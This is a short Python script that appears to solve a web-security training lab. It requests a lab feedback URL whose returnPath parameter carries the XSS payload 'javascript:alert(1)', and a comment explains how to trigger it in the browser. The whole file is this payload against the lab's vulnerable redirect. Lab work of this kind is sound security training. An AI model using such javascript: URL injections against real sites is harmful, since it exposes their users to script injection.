import requests

url = "https://0a0b00f90463349bc0dc904100530004.web-security-academy.net/feedback?returnPath=javascript:alert(1)"
#payload: javascript:alert(1)  -   to trigger payload on UI, run this url and complete feedback form.

solution = requests.get(url)
print(solution.content)